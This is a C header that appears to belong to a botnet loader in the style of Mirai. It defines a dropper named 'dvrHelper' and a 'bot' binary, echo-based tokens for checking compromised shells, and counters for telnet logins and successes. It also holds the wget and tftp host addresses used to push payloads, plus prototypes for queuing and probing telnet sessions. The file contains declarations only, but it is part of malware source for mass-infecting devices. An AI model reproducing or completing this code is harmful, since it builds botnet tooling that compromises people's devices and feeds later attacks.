#pragma once

#include "includes.h"
#include "connection.h"

#define FN_DROPPER "dvrHelper"
#define FN_BINARY "bot"

#define TOKEN_QUERY "echo -n \"VDOSS\""
#define TOKEN_RESPONSE "VDOSS"
#define VERIFY_STRING_HEX "\\x56\\x44\\x4F\\x53\\x53"
#define VERIFY_STRING_CHECK "VDOSS"
#define EXEC_QUERY "echo -n \"EXEC\""
#define EXEC_RESPONSE "EXEC"

struct server {
    ipv4_t *bind_addrs;
    uint8_t bind_addrs_len;
    uint32_t max_open;
    uint32_t curr_open;
    uint32_t total_input;
    uint32_t total_logins;
    uint32_t total_successes;
    uint32_t total_failures;
    uint32_t total_echoes;
    uint32_t total_wgets;
    uint32_t total_tftps;
    uint32_t curr_worker_child;
    char *wget_host_ip;
    port_t wget_host_port;
    char *tftp_host_ip;
    struct connection **estab_conns;
    struct server_worker *workers;
    int workers_len;
    pthread_t to_thrd;
};

struct server_worker {
    struct server *srv;
    int efd;
    int thread_id;
    pthread_t thread;
};

struct server *server_create(uint8_t, uint8_t, ipv4_t *, uint32_t, char *, port_t, char *);
void server_destroy(struct server *);
void server_queue_telnet(struct server *, struct telnet_info *);
void server_telnet_probe(struct server *, struct telnet_info *);
static void bind_core(int);
static void *worker(void *);
static void handle_event(struct server_worker *, struct epoll_event *);
static void *timeout_thread(void *);